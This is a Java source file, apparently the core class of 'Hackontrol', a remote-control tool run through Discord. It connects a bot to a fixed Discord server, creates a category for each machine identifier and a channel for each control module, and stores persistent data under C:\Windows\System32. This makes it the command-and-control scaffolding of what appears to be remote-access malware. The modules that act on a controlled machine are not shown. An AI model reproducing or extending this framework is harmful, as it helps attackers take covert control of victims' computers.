package com.khopan.hackontrol;

import java.io.File;
import java.util.Collections;
import java.util.List;

import javax.swing.JOptionPane;
import javax.swing.UIManager;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.module.Module;
import com.khopan.hackontrol.persistent.PersistentStorage;
import com.khopan.hackontrol.persistent.builtin.StringPresistent;
import com.khopan.hackontrol.persistent.file.FilePersistentStorage;
import com.khopan.hackontrol.registration.ManagerRegistry;
import com.khopan.hackontrol.registration.ModuleRegistry;
import com.khopan.hackontrol.registry.ClassRegistration;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
import com.khopan.hackontrol.utils.ErrorHandler;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY;
	public static final RegistryType<Void, Class<? extends Module>> MODULE_REGISTRY;

	public static final Logger LOGGER;
	public static final long STARTUP_TIME;
	public static final String PERSISTENT_NICKNAME;

	private static Hackontrol INSTANCE;

	static {
		STARTUP_TIME = System.currentTimeMillis();
		NativeLibrary.load();
		PERSISTENT_NICKNAME = "nickname";
		MANAGER_REGISTRY = RegistryType.create();
		MODULE_REGISTRY = RegistryType.create();
		LOGGER = LoggerFactory.getLogger("Hackontrol");
	}

	private final PersistentStorage persistentStorage;
	private final List<Manager> managerList;
	private final List<Module> moduleList;
	private final JDA bot;
	private final Guild guild;
	private final String machineIdentifier;
	private final Category category;

	private ErrorHandler handler;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		Thread.setDefaultUncaughtExceptionHandler(this :: handleError);
		this.persistentStorage = new FilePersistentStorage(new File("C:\\Windows\\System32\\persistent"));
		ManagerRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MANAGER_REGISTRY));
		ModuleRegistry.register(FilteredTypeRegistry.of(null, Hackontrol.MODULE_REGISTRY));
		this.managerList = ClassRegistration.list(null, Hackontrol.MANAGER_REGISTRY);
		this.moduleList = ClassRegistration.list(null, Hackontrol.MODULE_REGISTRY);

		for(int i = 0; i < this.moduleList.size(); i++) {
			Hackontrol.LOGGER.info("Registered module: {}", this.moduleList.get(i).getClass().getName());
		}

		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);

		for(int i = 0; i < this.managerList.size(); i++) {
			this.managerList.get(i).configureBuilder(builder);
		}

		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		this.machineIdentifier = Machine.getIdentifier();
		StringPresistent persistent = this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class);
		this.category = this.getOrCreateCategory(this.guild, this.getName(persistent.value));

		for(int i = 0; i < this.moduleList.size(); i++) {
			Module module = this.moduleList.get(i);
			TextChannel textChannel = this.getOrCreateTextChannelInCategory(this.category, module.getName());
			module.hackontrol = this;
			module.category = this.category;
			module.channel = textChannel;
			module.preInitialize(RegistryImplementation.of(module));

			if(MessageHistory.getHistoryFromBeginning(textChannel).complete().getRetrievedHistory().isEmpty()) {
				module.initialize();
			}

			module.postInitialize();
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);
			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
			manager.initialize();
		}
	}

	private String getName(String name) {
		if(name == null || name.isEmpty()) {
			return this.machineIdentifier;
		}

		return name + " - " + this.machineIdentifier;
	}

	private Category getOrCreateCategory(Guild guild, String name) {
		List<Category> list = guild.getCategoriesByName(name, true);

		if(list.isEmpty()) {
			return guild.createCategory(name).complete();
		}

		return list.get(0);
	}

	private TextChannel getOrCreateTextChannelInCategory(Category category, String name) {
		List<TextChannel> list = category.getTextChannels();
		boolean hasChannel = false;
		TextChannel targetChannel = null;

		for(int i = 0; i < list.size(); i++) {
			TextChannel channel = list.get(i);

			if(channel.getName().equalsIgnoreCase(name)) {
				hasChannel = true;
				targetChannel = channel;
				break;
			}
		}

		if(hasChannel) {
			return targetChannel;
		}

		return category.createTextChannel(name).complete();
	}

	private void handleError(Thread thread, Throwable Errors) {
		if(this.handler == null) {
			Errors.printStackTrace();
			return;
		}

		Hackontrol.LOGGER.warn("Uncaught Exception: {}", Errors.toString());
		this.handler.errorOccured(thread, Errors);
	}

	public PersistentStorage getPersistentStorage() {
		return this.persistentStorage;
	}

	public List<Manager> getManagerList() {
		return Collections.unmodifiableList(this.managerList);
	}

	@SuppressWarnings("unchecked")
	public <T extends Manager> T getManager(Class<T> managerClass) {
		if(managerClass == null) {
			throw new NullPointerException("Manager class cannot be null");
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);

			if(managerClass.isAssignableFrom(manager.getClass())) {
				return (T) manager;
			}
		}

		return null;
	}

	public List<Module> getModuleList() {
		return Collections.unmodifiableList(this.moduleList);
	}

	@SuppressWarnings("unchecked")
	public <T extends Module> T getModule(Class<T> moduleClass) {
		if(moduleClass == null) {
			throw new NullPointerException("Module class cannot be null");
		}

		for(int i = 0; i < this.moduleList.size(); i++) {
			Module module = this.moduleList.get(i);

			if(moduleClass.isAssignableFrom(module.getClass())) {
				return (T) module;
			}
		}

		return null;
	}

	public Module getModule(TextChannel textChannel) {
		if(textChannel == null) {
			throw new NullPointerException("Text channel cannot be null");
		}

		for(int i = 0; i < this.moduleList.size(); i++) {
			Module module = this.moduleList.get(i);

			if(textChannel.equals(module.channel)) {
				return module;
			}
		}

		return null;
	}

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public String getMachineIdentifier() {
		return this.machineIdentifier;
	}

	public Category getCategory() {
		return this.category;
	}

	public ErrorHandler getErrorHandler() {
		return this.handler;
	}

	public String getNickname() {
		return this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class).value;
	}

	public void setErrorHandler(ErrorHandler handler) {
		this.handler = handler;
	}

	public void setNickname(String nickname) {
		this.category.getManager().setName(this.getName(nickname)).queue(empty -> {
			StringPresistent persistent = new StringPresistent();
			persistent.value = nickname;
			this.persistentStorage.save(Hackontrol.PERSISTENT_NICKNAME, persistent, StringPresistent.class);
		}, throwable -> {
			this.handleError(Thread.currentThread(), throwable);
		});
	}

	public static void main(String[] args) throws Throwable {
		//NativeLibrary.critical(true);
		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		JOptionPane.showConfirmDialog(null, args == null || args.length < 1 ? "null" : args[0], "Hackontrol", JOptionPane.OK_CANCEL_OPTION, JOptionPane.INFORMATION_MESSAGE);
		/*HackontrolLoggerConfig.disableDebug();
		Hackontrol.LOGGER.info("Initializing");
		Hackontrol.getInstance();*/
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}
}
